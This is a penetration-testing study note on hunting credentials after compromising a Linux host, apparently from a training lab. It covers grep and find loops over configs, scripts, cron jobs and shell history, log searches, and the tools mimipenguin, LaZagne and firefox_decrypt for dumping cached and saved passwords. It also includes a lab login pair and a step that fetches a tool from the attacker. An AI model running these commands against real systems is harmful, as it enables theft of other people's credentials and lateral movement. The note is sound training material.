# NOTE — Credential Hunting in Linux

## ID
523

## Module
Password Attacks

## Kind
methodology

## Title
Section 17 — Credential Hunting in Linux

## Description
Search a compromised Linux host for credentials in configs, scripts, cronjobs, history files, logs, in-memory caches (mimipenguin), and Firefox saved logins (firefox_decrypt).

## Tags
credential-hunting, linux, mimipenguin, lazagne, firefox-decrypt, bash-history, configs, cronjobs, logs, browser

## Commands
- `grep -r 'pass' /home/ /etc/ 2>/dev/null`
- `find / -type f \( -name "*.conf" -o -name "*.cnf" -o -name "*.config" \) 2>/dev/null`
- `find /home/* -type f -name "*.txt" -o ! -name "*.*"`
- `tail -n5 /home/*/.bash*`
- `crontab -l`
- `cat /etc/crontab; ls -la /etc/cron.*`
- `sudo python3 mimipenguin.py`
- `python3.9 firefox_decrypt.py`
- `sudo python3 laZagne.py all`

## Concept Overview
Four credential storage categories on Linux:
1. **Files** — configs, DBs, notes, scripts, cronjobs, SSH keys
2. **History** — `.bash_history`, log files
3. **Memory / cache** — GNOME keyrings, in-memory passwords (mimipenguin)
4. **Browsers / keyrings** — Firefox/Chrome saved logins, GNOME Keyring, KWallet

## Files

### Configuration Files (`.conf`, `.cnf`, `.config`)
```bash
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

Inline grep for credentials across `.cnf` files:
```bash
for i in $(find / -name "*.cnf" 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: $i"
  grep "user\|password\|pass" "$i" 2>/dev/null | grep -v "\#"
done
```

### Databases
```bash
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

### Notes (any-extension or no-extension files in `/home`)
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: $l"
  find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

### Cronjobs
```bash
cat /etc/crontab
ls -la /etc/cron.*/
crontab -l       # current user
sudo crontab -l -u <user>
```
Scripts called by cron often contain hard-coded service-account credentials or reference keytab/key files.

## History

### Shell history
```bash
tail -n5 /home/*/.bash_history /home/*/.bashrc /home/*/.zsh_history
cat /root/.bash_history 2>/dev/null
```
Frequent gold: `sshpass -p '...'`, `curl -u user:pass`, `mysql -p<pass>`, `wget --user= --password=`.

### Log files
```bash
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" "$i" 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: $i"
    echo "$GREP"
  fi
done
```

Common log files:
| File | What |
|------|------|
| `/var/log/auth.log` (Debian) / `/var/log/secure` (RedHat) | Auth events |
| `/var/log/syslog`, `/var/log/messages` | General system events |
| `/var/log/apache2/access.log` | Sometimes contains URLs with `?password=` |
| `/var/log/mysqld.log` | Connection failures may leak usernames |
| `/var/log/cron` | What ran when (correlate with credentials in scripts) |

## Memory / In-Process Caches

### mimipenguin
Linux equivalent of Mimikatz — extracts cleartext passwords from active sessions (GDM, sshd, sudo, gnome-keyring). **Requires root.**
```bash
sudo python3 mimipenguin.py
```

### LaZagne (Linux variant)
Comprehensive sweep covering WiFi, wpa_supplicant, libsecret, KWallet, Chromium browsers, Mozilla, SSH, Apache, Docker, KeePass, sessions, keyrings.
```bash
sudo python2.7 laZagne.py all
```

## Browser Credentials

### Firefox
Credentials live in `~/.mozilla/firefox/<profile>.default-release/logins.json` (AES-encrypted) + `key4.db` (master key).

Use [firefox_decrypt](https://github.com/unode/firefox_decrypt) (Python 3.9+):
```bash
python3.9 firefox_decrypt.py
```
Pick a profile when prompted; cleartext URLs + creds are dumped.

### Chrome / Chromium
On Linux, Chromium-based browsers store the master key in the OS keyring (GNOME Keyring or KWallet). If neither is unlocked, the key falls back to a hardcoded `peanuts` string (literally). LaZagne `browsers` module handles both paths.

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Will's password (Firefox saved login) | **(hidden — see HTB walkthrough)** | SSH as `kira:L0vey0u1!` → check `~/.mozilla/firefox/...default-release/` → wget `firefox_decrypt.py` from attacker → run with `python3.9` → select profile 2 |

## Key Takeaways
- Triage in this order on a fresh Linux foothold: bash_history → cron + scripts → world-readable configs → mimipenguin (if root) → browser stores.
- `sshpass -p` in bash history = a free pivot to another host.
- LaZagne for Linux is Python 2 (`laZagne.py`) — make sure you have `python2.7` available, or use the modern fork.
- Saved Firefox passwords without a master password are recoverable with the user's `key4.db` alone — no cracking required.

## Gotchas
- mimipenguin requires root *and* the target service (GDM, gnome-keyring) to be currently running with cached creds.
- `/etc/shadow` permissions still apply — most file-credential hunts work as a normal user, but `/etc/shadow` itself does not.
- LaZagne is loud on EDR-equipped hosts. Don't run it blind on a real engagement.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[16-linux-authentication-process]] | [[18-credential-hunting-in-network-traffic]] →
<!-- AUTO-LINKS-END -->
